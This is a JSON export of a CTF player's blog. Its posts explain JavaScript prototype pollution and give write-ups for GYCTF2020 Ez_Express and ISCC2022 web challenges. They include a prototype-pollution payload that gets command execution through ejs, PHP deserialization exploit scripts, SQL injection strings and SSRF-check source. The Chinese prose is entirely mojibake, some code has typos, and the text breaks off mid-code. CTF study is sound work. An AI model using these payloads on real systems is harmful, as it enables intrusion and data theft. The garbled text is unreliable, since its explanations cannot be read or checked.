{"meta":{"title":"mrl64's Blog","subtitle":"","description":"summer again","author":"liszt_lin","url":"http://example.com","root":"/"},"pages":[{"title":"About me","date":"2021-09-18T01:53:01.000Z","updated":"2021-12-16T11:46:16.957Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"Iâ€™m mrl64Just a dumb noobHaving fun in ctf"},{"title":"categories","date":"2021-09-18T01:39:42.000Z","updated":"2021-09-18T01:41:02.269Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-09-18T01:39:20.000Z","updated":"2021-09-18T01:41:26.232Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"jsçš„åŸå‹é“¾æ±¡æŸ“","slug":"jsçš„åŸå‹é“¾æ±¡æŸ“","date":"2022-05-26T08:06:53.000Z","updated":"2022-05-26T13:35:13.228Z","comments":true,"path":"2022/05/26/jsçš„åŸå‹é“¾æ±¡æŸ“/","link":"","permalink":"http://example.com/2022/05/26/js%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","excerpt":"å‰è¨€ ISCCç»“æŸå‰å‡ å¤©å°±å¼€å§‹çœ‹åŸå‹é“¾è¿™ä¸€å—äº†ï¼Œä¸ºäº†å¡«ä¸Šä¹‹å‰é‚£ç¯‡åšå®¢çš„å‘è¿˜æ˜¯å•ƒäº†ä¸€ä¼šçš„ï¼Œå› ä¸ºæ²¡æœ‰å¾ˆç³»ç»Ÿäº†è§£è¿‡jså› æ­¤ç†è§£èµ·æ¥ä¸æ˜¯ç‰¹åˆ«é¡ºåˆ©ã€‚","text":"å‰è¨€ ISCCç»“æŸå‰å‡ å¤©å°±å¼€å§‹çœ‹åŸå‹é“¾è¿™ä¸€å—äº†ï¼Œä¸ºäº†å¡«ä¸Šä¹‹å‰é‚£ç¯‡åšå®¢çš„å‘è¿˜æ˜¯å•ƒäº†ä¸€ä¼šçš„ï¼Œå› ä¸ºæ²¡æœ‰å¾ˆç³»ç»Ÿäº†è§£è¿‡jså› æ­¤ç†è§£èµ·æ¥ä¸æ˜¯ç‰¹åˆ«é¡ºåˆ©ã€‚ ç»§æ‰¿ä¸åŸå‹é“¾æˆ‘ä»¬éƒ½çŸ¥é“jsæ˜¯é¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€ï¼Œå› æ­¤jsæœ‰å¾ˆå¤šéªšæ“ä½œæ˜¯åˆ«çš„ç¼–ç¨‹è¯­è¨€æ²¡æœ‰çš„ã€‚è€Œjsæ˜¯åŠ¨æ€çš„ï¼Œæœ¬èº«ä¸æä¾›ä¸€ä¸ªclassçš„å®ç°ã€‚å³ä¾¿æ˜¯åœ¨ES2015/ES6ä¸­å¼•å…¥äº†classå…³é”®å­—ï¼Œä½†é‚£ä¹Ÿåªæ˜¯è¯­æ³•ç³–ï¼Œjsä»ç„¶æ˜¯åŸºäºåŸå‹çš„ã€‚ jsä¸­åªæœ‰ä¸€ç§ç»“æ„ï¼šå¯¹è±¡ï¼ˆobjectï¼‰ã€‚æ¯ä¸ªobjéƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§ï¼ˆ__proto__ï¼‰æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„åŸå‹é“¾å¯¹è±¡ï¼ˆprototypeï¼‰ã€‚ç„¶åè¿™ä¸ªåŸå‹å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªè‡ªå·±çš„åŸå‹å¯¹è±¡ï¼Œè¿™æ ·å±‚å±‚å‘ä¸ŠçŸ¥é“NULLã€‚é‚£ä¹ˆæ ¹æ®åŸå‹é“¾å®šä¹‰ï¼ŒNULLå°±æ˜¯åŸå‹é“¾ä¸­æœ€åä¸€ä¸ªç¯èŠ‚ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬æ¥åˆ†æä¸‹ä»€ä¹ˆæ˜¯prototypeå’Œ__proto__ã€‚ jsä¸­æˆ‘ä»¬å¦‚æœæƒ³è¦å®šä¹‰ä¸€ä¸ªç±»ï¼Œéœ€è¦ä»¥å®šä¹‰å‡½æ•°çš„æ–¹å¼æ¥å®ç°ï¼š 12345678function Foo() &#123; this.bar = 1 this.show = function() &#123; console.log(this.bar) &#125;&#125;(new Foo()).show() è¿™æ ·å†™ç¡®å®å¯ä»¥å®ç°ï¼Œä½†æ˜¯ä¼šäº§ç”Ÿä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ¯æ–°å»ºä¸€ä¸ªFooå¯¹è±¡ï¼Œthis.show = function()â€¦å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œå› ä¸ºshowæ–¹æ³•å®é™…ä¸Šè¿˜æ˜¯ç»‘å®šåœ¨å¯¹è±¡ä¸Šï¼Œè€Œå¹¶éâ€œç±»â€ã€‚ å¦‚æœæˆ‘å¸Œæœ›åˆ›å»ºç±»æ—¶åªåˆ›å»ºä¸€æ¬¡showæ–¹æ³•ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°prototypeï¼š 123456789101112function Foo() &#123; this.bar = 1&#125;Foo.prototype.show = function show() &#123; console.log(this.bar)&#125;let foo = new Foo()foo.show()//1 æˆ‘ä»¬å¯ä»¥è®¤ä¸ºåŸå‹prototypeæ˜¯ç±»Fooçš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ‰€æœ‰ç”¨Fooç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚æ¯”å¦‚ä¸Šå›¾ä¸­çš„fooå¯¹è±¡ï¼Œå…¶å¤©ç”Ÿå°±å…·æœ‰foo.show()æ–¹æ³•ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡Foo.prototypeæ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä½†Fooå®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œæ˜¯ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹çš„ã€‚è¿™æ—¶å€™ï¼Œå°±è¯¥__proto__ç™»åœºäº†: 12foo.__proto__ == Foo.prototype//true åŸºäºjsåŸå‹é“¾çš„ç»§æ‰¿jsçš„ç»§æ‰¿æœºåˆ¶åˆ©ç”¨çš„æ˜¯ç±»å¯¹è±¡å®ä¾‹åŒ–æ—¶æ‹¥æœ‰prototypeä¸­çš„å±æ€§ä¸æ–¹æ³•ï¼Œpç‰›åœ¨ä»–çš„æ–‡ç« ä¸­ç”¨ä¸€ä¸ªç”ŸåŠ¨å½¢è±¡çš„ä¾‹å­å‘æˆ‘ä»¬å±•ç¤ºäº†è¿™ä¸ªæœºåˆ¶ï¼š 123456789101112131415function Father() &#123; this.first_name = &#x27;Donald&#x27; this.last_name = &#x27;Trump&#x27;&#125;function Son() &#123; this.first_name = &#x27;Melania&#x27;&#125;Son.prototype = new Father()let son = new Son()console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)//Name: Melania Trump å¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºæ¥ï¼ŒSonç±»ç»§æ‰¿äº†Fatherç±»ä¸­last_nameçš„å±æ€§ï¼Œæ•´ä¸ªæ“ä½œè¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š åœ¨å¯¹è±¡Sonä¸­å¯»æ‰¾last_name å¦‚æœæ‰¾ä¸åˆ°ï¼Œå°±åœ¨son.__proto__ä¸­å¯»æ‰¾last_name å°±è¿™æ ·ä¸€å±‚ä¸€å±‚å¾€ä¸Šå¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°last_nameæˆ–NULLç»“æŸ 123son.__proto__//Object &#123; first_name: &quot;Donald&quot;, last_name: &quot;Trump&quot; &#125; è¿™ä¸ªæŸ¥æ‰¾æœºåˆ¶è¢«ç§°ä¸ºprototypeç»§æ‰¿è¿ã€‚ jsåŸå‹é“¾æ±¡æŸ“ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“ç»“åˆä¹‹å‰æ‰€ä»‹ç»çš„ï¼Œæˆ‘ä»¬ä¸ç¦å‘å‡ºç–‘é—®ï¼Œå¦‚æœæˆ‘ä»¬ä¿®æ”¹äº†foo.__proto__ä¸­çš„å€¼ï¼Œé‚£ä¹ˆä¼šä¸ä¼šæ”¹å˜Fooç±»å‘¢ï¼Ÿå¸¦ç€è¿™ä¸ªç–‘é—®ï¼Œæˆ‘ä»¬æ¥è¿›è¡Œæµ‹è¯•ï¼š 12345678910let foo = &#123;mrl64: 1&#125;console.log(foo.mrl64)foo.__proto__.mrl64 = 2console.log(foo.mrl64)let sp = &#123;&#125;console.log(sp.mrl64)//1 1 2 æˆ‘ä»¬å‘ç°æœ€åä¸€ä¸ªspæ˜¯ä¸€ä¸ªç©ºå¯¹è±¡ï¼Œä½†æ˜¯è¾“å‡ºsp.mrl64çš„ç»“æœæ˜¯2ï¼Œè¿™æ­£æ˜¯ç”±äºä¿®æ”¹äº†fooçš„åŸå‹foo.proto.mrl64è¿™ä¸ªobjç±»ï¼Œç»™è¿™ä¸ªç±»å¢åŠ äº†ä¸€ä¸ªå±æ€§mrl64ï¼Œå€¼ä¸º2ã€‚è€Œåœ¨è¿™ä¹‹åï¼Œæˆ‘ä»¬ç”¨objç±»åˆ›å»ºäº†ä¸€ä¸ªspå¯¹è±¡ï¼Œå› æ­¤spå¯¹è±¡ä¸­è‡ªç„¶ä¼šæœ‰ä¸€ä¸ªspå±æ€§ã€‚ åœ¨åº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ï¼Œè¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚ ä»€ä¹ˆæƒ…å†µä¸‹ä¼šå­˜åœ¨åŸå‹é“¾æ±¡æŸ“è¿™å°±æ¶‰åŠåˆ°åœ¨å“ªäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è®¾ç½®__proto__çš„å€¼äº†ï¼Œå…¶å®å¯ä»¥æ§åˆ¶æ•°ç»„é”®åçš„æ“ä½œå°±å¯ä»¥åšåˆ°ï¼Œä¾‹å¦‚ï¼š å¯¹è±¡merge å¯¹è±¡cloneï¼ˆå°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰ mergeå‡½æ•°ï¼š 123456789function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125; çœ‹åˆ°æœ€åä¸€ä¸ªèµ‹å€¼è¯­å¥æˆ‘ä»¬ä¸ç¦å°±æ¥äº†æƒ³æ³•äº†ï¼Œå¦‚æœè¿™ä¸ªkeyçš„åç§°å°±æ˜¯__proto__ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥è§¦å‘åŸå‹é“¾æ±¡æŸ“äº†ï¼Ÿæˆ‘ä»¬åŒæ ·è¯•éªŒä¸€ä¸‹ï¼š 123456789let test1 = &#123;&#125;let test2 = &#123;a&quot;1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;merge(test1,test2)console.log(test1.a, test1.b)test3 = &#123;&#125;console.log(test3.b)//1 2 &#123;&#125; å¯ä»¥å‘ç°åˆå¹¶æˆåŠŸï¼Œä½†æ˜¯åŸå‹é“¾æ±¡æŸ“å¤±è´¥ã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬ç”¨jsåˆ›å»ºtest2çš„è¿‡ç¨‹ä¸­ï¼Œ__proto__å·²ç»ä»£è¡¨test2çš„åŸå‹äº†ï¼Œæ­¤æ—¶éå†test2çš„é”®å__protp__å¹¶ä¸æ˜¯ä¸€ä¸ªkeyï¼Œå› æ­¤ä¸ä¼šä¿®æ”¹objåŸå‹ã€‚ é‚£ä¹ˆè¯¥æ€ä¹ˆè¿›è¡Œå¤„ç†å‘¢ï¼Œæˆ‘ä»¬æ¥åº·åº·è¿™ä¸ªä»£ç ï¼š 123456789let test1 = &#123;&#125;let test2 = JSON.parse&#123;&#x27;&#123;a&quot;1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;&#x27;&#125;merge(test1,test2)console.log(test1.a, test1.b)test3 = &#123;&#125;console.log(test3.b)//1 2 2 è¿™æ¬¡åŸå‹é“¾è¢«æˆåŠŸæ±¡æŸ“äº†ï¼Œè¿™æ˜¯å› ä¸ºJSONè§£æä¸‹ï¼Œ__proto__è¢«è®¤ä¸ºæ˜¯çœŸæ­£çš„é”®åè€Œå¹¶éåŸå‹ã€‚margeæ“ä½œæå…¶å®¹æ˜“å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œå¤šä¸ªå¸¸è§åº“ä¸­éƒ½å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚ [GYCTF2020]Ez_Expressè¿›å…¥ç½‘é¡µæ˜¯ä¸ªloginé¡µé¢ï¼Œæç¤ºæˆ‘ä»¬è¦æ³¨å†Œï¼Œç”¨æˆ·ååªæ”¯æŒå¤§å†™ä¸”éœ€è¦ä½¿ç”¨ADMINç™»å½•ï¼Œä½†æ˜¯æ³¨å†Œé¡µé¢åˆå•¥éƒ½æ²¡æœ‰ã€‚ æ€€ç–‘å­˜åœ¨ä¿¡æ¯æœé›†ï¼Œæµ‹è¯•å‘ç°å­˜åœ¨www.zipï¼Œä¸‹è½½åå®¡è®¡æºç ï¼š 12345678910111213141516171819202122232425//loginéƒ¨åˆ†router.post(&#x27;/login&#x27;, function (req, res) &#123; if(req.body.Submit==&quot;register&quot;)&#123; if(safeKeyword(req.body.userid))&#123; res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; req.session.user=&#123; &#x27;user&#x27;:req.body.userid.toUpperCase(), &#x27;passwd&#x27;: req.body.pwd, &#x27;isLogin&#x27;:false &#125; res.redirect(&#x27;/&#x27;); &#125; else if(req.body.Submit==&quot;login&quot;)&#123; if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123; req.session.user.isLogin=true; &#125; else&#123; res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; &#125; res.redirect(&#x27;/&#x27;); ;&#125;); å¯ä»¥å‘ç°ä½¿ç”¨äº†toUpperCase()ï¼Œé‚£å°±æ˜¯ä¸€ä¸ªç»å…¸trickäº†ï¼Œç™»å½•è´¦å·è¾“å…¥admÄ±nç„¶åç‚¹å‡»æ³¨å†Œï¼Œè¿™æ¬¡å‡ºç°é¡µé¢äº†ã€‚æœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œé—®æˆ‘ä»¬æœ€å–œæ¬¢çš„è¯­è¨€ï¼Œéšä¾¿å¡«éƒ½ä¼šalertä¸€ä¸ªsuccessï¼Œé‚£æˆ‘ä»¬ç»§ç»­å®¡è®¡ï¼š 123456//actionéƒ¨åˆ†router.post(&#x27;/action&#x27;, function (req, res) &#123; if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; req.session.user.data = clone(req.body); res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;); &#125;); æˆ‘ä»¬åœ¨è¿™é‡Œçœ‹åˆ°äº†cloneå‡½æ•°ï¼š 1234567891011121314151617181920const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125;function safeKeyword(keyword) &#123; if(keyword.match(/(admin)/is)) &#123; return keyword &#125; return undefined&#125; çœ‹åˆ°è¿™ä¸¤ä¸ªå‡½æ•°ç›¸ä¿¡åº”è¯¥å°±èƒ½ååº”è¿‡æ¥è¦ä½¿ç”¨åŸå‹é“¾æ±¡æŸ“äº†ï¼Œç»“åˆé¢˜ç›®çš„åå­—ï¼Œä¸éš¾æƒ³åˆ°åˆ©ç”¨ejsæ¥è¿›è¡ŒRCEï¼Œå°¤å…¶æ˜¯ä»£ç ä¸­æ˜¾çœ¼çš„ä¸è¡Œçš„outputFunctionNameï¼š 123router.get(&#x27;/info&#x27;, function (req, res) &#123; res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);&#125;) å…·ä½“åŸç†å¯ä»¥å‚è€ƒä¸‹è¿™ç¯‡æ–‡ç« ï¼šExpress+lodash+ejs: ä»åŸå‹é“¾æ±¡æŸ“åˆ°RCE é‚£ä¹ˆæˆ‘ä»¬æ„å»ºpayloadï¼š 123Content-Type: application/json&#123;&quot;lua&quot;:&quot;a&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125; æ¥ç€è®¿é—®/infoå³å¯è·å–flagã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-js -web","slug":"js-web","permalink":"http://example.com/tags/js-web/"}]},{"title":"ã€ISCC2022ã€‘write up(web+misc)","slug":"ã€ISCC2022ã€‘write-up-web-misc","date":"2022-05-26T04:07:09.000Z","updated":"2022-05-26T11:32:37.915Z","comments":true,"path":"2022/05/26/ã€ISCC2022ã€‘write-up-web-misc/","link":"","permalink":"http://example.com/2022/05/26/%E3%80%90ISCC2022%E3%80%91write-up-web-misc/","excerpt":"å‰è¨€ ç»ˆäºæ‰“å®Œäº†ISCCï¼Œç”±äºæ˜¯èµ›åå†™çš„å› æ­¤æ²¡æœ‰å¤ç°ç¯å¢ƒï¼Œæ‰€ä»¥å°±ç®€å•å†™å†™wpäº†ã€‚","text":"å‰è¨€ ç»ˆäºæ‰“å®Œäº†ISCCï¼Œç”±äºæ˜¯èµ›åå†™çš„å› æ­¤æ²¡æœ‰å¤ç°ç¯å¢ƒï¼Œæ‰€ä»¥å°±ç®€å•å†™å†™wpäº†ã€‚ WEBå†¬å¥¥ä¼šæºç ï¼š 1234567891011121314151617181920212223242526272829303132&lt;?phpshow_source(__FILE__);$Step1=False;$Step2=False;$info=(array)json_decode(@$_GET[&#x27;Information&#x27;]);if(is_array($info))&#123; var_dump($info); is_numeric(@$info[&quot;year&quot;])?die(&quot;Sorry~&quot;):NULL; if(@$info[&quot;year&quot;])&#123; (@$info[&quot;year&quot;]=2022)?$Step1=True:NULL; &#125; if(is_array(@$info[&quot;items&quot;]))&#123; if(!is_array($info[&quot;items&quot;][1])OR count($info[&quot;items&quot;])!=3) die(&quot;Sorry~&quot;); $status = array_search(&quot;skiing&quot;, $info[&quot;items&quot;]); $status===false?die(&quot;Sorry~&quot;):NULL; foreach($info[&quot;items&quot;] as $key=&gt;$val)&#123; $val===&quot;skiing&quot;?die(&quot;Sorry~&quot;):NULL; &#125; $Step2=True; &#125;&#125;if($Step1 &amp;&amp; Step2)&#123; include &quot;2022flag.php&quot;;echo $flag;&#125;?&gt; ç­¾åˆ°é¢˜ï¼Œå‡ ä¸ªæ¯”è¾ƒç®€å•çš„trickï¼Œä¸è§£é‡Šäº†ï¼Œç›´æ¥payloadï¼š 1?Information=&#123;&quot;year&quot;:&quot;2022,&quot;,&quot;items&quot;:[0,[&quot;1skiing&quot;],&quot;1skiing&quot;]&#125; çˆ±å›½æ•¬ä¸šå¥½é’å¹´-1ç»æ€ï¼Œæ— è§£ã€‚ çˆ±å›½æ•¬ä¸šå¥½é’å¹´-2è¿›å…¥é¢˜ç›®è¦è¾“å…¥ä¸€ä¸ªç»çº¬åº¦ï¼Œé—®é¢˜æ˜¯çˆ±å›½æ•¬ä¸šå¥½é’å¹´ä½åœ¨å“ªé‡Œã€‚ç»“åˆç¬¬ä¸€é¢˜ä¸­å­˜åœ¨1.jpgæç¤ºæˆ‘ä»¬ç…§ç‰‡æ‹æ‘„åœ°ç‚¹ä¸ºèƒŒæ™¯å¤©å®‰é—¨å¹¿åœºï¼Œå› æ­¤å¡«å…¥å¤©å®‰é—¨ç»çº¬åº¦ï¼Œä½†æ˜¯å¼¹å‡ºäº†æç¤ºï¼š 1flas=icss&#123;Y0u_M@y_FiNd_1_WEONG_eNtrance!!!&#125; å…¥å£é”™è¯¯ï¼ŒæŸ¥çœ‹æºç å‘ç°/flagï¼ŒçŒœæµ‹è¿™é‡Œæ‰æ˜¯çœŸæ­£çš„å…¥å£ï¼ŒæŠ“åŒ…è·å–POSTçš„å‚æ•°å¹¶ä¼ å…¥/flagä¸­è·å–flagã€‚ payloadï¼š 1lati=116Â°23â€²E&amp;langti=39Â°54â€²N Pop2022MRCTFçš„åŸé¢˜ï¼ŒNISACTFä¹Ÿè€ƒè¿‡ï¼Œå°±æ‡’å¾—æ”¾æºç äº†ï¼Œexpå¦‚ä¸‹ï¼š 123456789101112131415161718192021&lt;?php class Road_is_Long&#123;public $page;public $string;&#125;class Make_a_Change&#123;public $effort;&#125;class Try_Work_Hard&#123;protected $var;function __construct()&#123;$this-&gt;var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;&#125;$s = new Road_is_Long();$t = new Make_a_Change();$r = new Try_Work_Hard();$t-&gt;effort = $r;$s-&gt;string = $t;$s-&gt;page = $s;var_dump(urlencode(serialize($s))); Easy-SQLsqlæ³¨å…¥ï¼Œä½†æ˜¯selectè¢«è¿‡æ»¤äº†ï¼Œå› æ­¤æƒ³åˆ°ä¹‹å‰äº†è§£è¿‡å¾—selectçš„å¹³æ›¿tableï¼Œè¡¨æ ¼åä¸ºemailï¼Œæ³¨å…¥å‡ºé‚®ç®±ï¼š 1?id=1 union table emails limit 7,1--+ é‚®ç®±åå­—æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…åï¼Œä¸‹è½½è¿™ä¸ªå‹ç¼©åŒ…è·å–index.phpçš„æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?phpinclude &quot;./config.php&quot;;// error_reporting(0);// highlight_file(__FILE__);$conn = mysqli_connect($hostname, $username, $password, $database); if ($conn-&gt;connect_errno) &#123; die(&quot;Connection failed: &quot; . $conn-&gt;connect_errno);&#125; echo &quot;Where is the database?&quot;.&quot;&lt;br&gt;&quot;;echo &quot;try ?id&quot;;function sqlWaf($s)&#123; $filter = &#x27;/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|&gt;|&lt;|;|&quot;|\\^|\\||\\ |\\&#x27;/i&#x27;; if (preg_match($filter,$s)) return False; return True;&#125;if (isset($_GET[&#x27;id&#x27;])) &#123; $id = $_GET[&#x27;id&#x27;]; $sql = &quot;select * from users where id=$id&quot;; $safe = preg_match(&#x27;/select/is&#x27;, $id); if($safe!==0) die(&quot;No select!&quot;); $result = mysqli_query($conn, $sql); if ($result) &#123; $row = mysqli_fetch_array($result); echo &quot;&lt;h3&gt;&quot; . $row[&#x27;username&#x27;] . &quot;&lt;/h3&gt;&lt;br&gt;&quot;; echo &quot;&lt;h3&gt;&quot; . $row[&#x27;passwd&#x27;] . &quot;&lt;/h3&gt;&quot;; &#125; else die(&#x27;&lt;br&gt;Error!&#x27;);&#125;if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;])) &#123; $username = strval($_POST[&#x27;username&#x27;]); $passwd = strval($_POST[&#x27;passwd&#x27;]); if ( !sqlWaf($passwd) ) die(&#x27;damn hacker&#x27;); $sql = &quot;SELECT * FROM users WHERE username=&#x27;$&#123;username&#125;&#x27; AND passwd= &#x27;$&#123;passwd&#125;&#x27;&quot;; $result = $conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; $row = $result-&gt;fetch_assoc(); if ( $row[&#x27;username&#x27;] === &#x27;admin&#x27; &amp;&amp; $row[&#x27;passwd&#x27;] ) &#123; if ($row[&#x27;passwd&#x27;] == $passwd) &#123; die($flag); &#125; else &#123; die(&quot;username or passwd wrong, are you admin?&quot;); &#125; &#125; else &#123; die(&quot;wrong user&quot;); &#125; &#125; else &#123; die(&quot;user not exist or wrong passwd&quot;); &#125;&#125;mysqli_close($conn); ?&gt; å®¡è®¡ä»£ç ï¼Œç”¨usernameæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œé‚£å°±ç”¨vlauesæ³¨å…¥å‡ºflagï¼š 1username=admin&#x27; union values row(10,&#x27;admin&#x27;,1)#&amp;passwd=1 Find meè¿›å»ä¸€å¼ èµ›åšæœ‹å…‹çš„å›¾ï¼Œå®¡æŸ¥å…ƒç´ å‘ç°unser.phpï¼Œå®¡è®¡æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phphighlight_file(__FILE__);class a&#123; public $un0; public $un1; public $un2; public $un3; public $un4; public function __destruct()&#123; if(!empty(this-&gt;un0) &amp;&amp; empty($this-&gt;un2))&#123; $this -&gt; Givemeanew(); if($this -&gt; un3 === &#x27;unserialize&#x27;)&#123; $this -&gt; yigei(); &#125; else&#123; $this -&gt; giao(); &#125; &#125; &#125; public funtion Givemeanew()&#123; $this -&gt; un4 = new $this-&gt;un0($this -&gt; un1); &#125; public function yigei()&#123; echo &#x27;Your output: &#x27;.$this-&gt;un4; &#125; public function giao()&#123; @eval($this-&gt;un2); &#125; public function __wakeup()&#123; include $this -&gt; un2.&#x27;hint.php&#x27;; &#125;&#125;$data = $_POST[&#x27;data&#x27;];unserialize($data); è¿™çœ‹åˆ°Givemeanewè¿™ä¸ªå‡½æ•°ä¼°è®¡å°±æ˜¯åŸç”Ÿç±»åº”ç”¨äº†ï¼Œexpï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpclass a&#123; public $un0; public $un1; public $un2; public $un3; public $un4; public function __destruct()&#123; if(!empty($this-&gt;un0) &amp;&amp; empty($this-&gt;un2))&#123; $this -&gt; Givemeanew(); if($this -&gt; un3 === &#x27;unserialize&#x27;)&#123; $this -&gt; yigei(); &#125; else&#123; $this -&gt; giao(); &#125; &#125; &#125; public function Givemeanew()&#123; $this -&gt; un4 = new $this-&gt;un0($this -&gt; un1); &#125; public function yigei()&#123; echo &#x27;Your output: &#x27;.$this-&gt;un4; &#125; public function giao()&#123; @eval($this-&gt;un2); &#125; public function __wakeup()&#123; include $this -&gt; un2.&#x27;hint.php&#x27;; &#125;&#125;$a=new a();$a-&gt;un3=&quot;unserialize&quot;;//è¯»å–hintå†…å®¹ï¼ŒçŸ¥é“flagæ–‡ä»¶å¼€å¤´ä¸ºf//$a-&gt;un0=&quot;SplFileObject&quot;;//$a-&gt;un1=&quot;php://filter/read=convert.base64-encode/resource=hint.php&quot;;//echo base64_decode(&quot;PD9waHANCiRhID0gJ2ZsYWflnKjlvZPliY3nm67lvZXkuIvku6XlrZfmr41m5byA5aS055qEdHh05LitLOaXoOazleeIhuegtOWHuuadpSc7&quot;);//æ‰¾åˆ°flagæ‰€æ”¾ç½®çš„æ–‡ä»¶//$a-&gt;un0=&#x27;DirectoryIterator&#x27;;//$a-&gt;un1=&#x27;glob://./*f*&#x27;;//è¯»å–flagæ–‡ä»¶$a-&gt;un0=&quot;SplFileObject&quot;;$a-&gt;un1=&quot;flllHL91244ggg-SecR1et.txt&quot;;echo serialize($a); è¿™æ˜¯ä¸€é“ä»£ç å®¡è®¡é¢˜è¿›å…¥ç½‘é¡µåè®©æˆ‘ä»¬è®¿é—®/indexï¼Œè®¿é—®åé¡µé¢ä¸Šåªæœ‰404ï¼ŒæŠ“åŒ…å‘ç°cookieä¸­çš„loginä¸º0ï¼Œæ”¹ä¸º1åé¡µé¢ä¸­å‡ºç°äº†url=127.0.0.1ã€‚ é‚£ä¹ˆæˆ‘ä»¬GETä¼ å‚urlï¼Œå‘ç°ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼š./static/code.txt è®¿é—®åæ˜¯ä¸€å¯¹emojiï¼Œbase100è§£ç å¾—åˆ°æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556def geneSign(): if(control_key==1): return render_template(&quot;index.html&quot;) else: return &quot;You have not access to this page!&quot;def check_ssrf(url): hostname = urlparse(url).hostname try: if not re.match(&#x27;https?://(?:[-\\w.]|(?:%[\\da-fA-F]&#123;2&#125;))+&#x27;, url): if not re.match(&#x27;https?://@(?:[-\\w.]|(?:%[\\da-fA-F]&#123;2&#125;))+&#x27;, url): raise BaseException(&quot;url format error&quot;) if re.match(&#x27;https?://@(?:[-\\w.]|(?:%[\\da-fA-F]&#123;2&#125;))+&#x27;, url): if judge_ip(hostname): return True return False, &quot;You not get the right clue!&quot; else: ip_address = 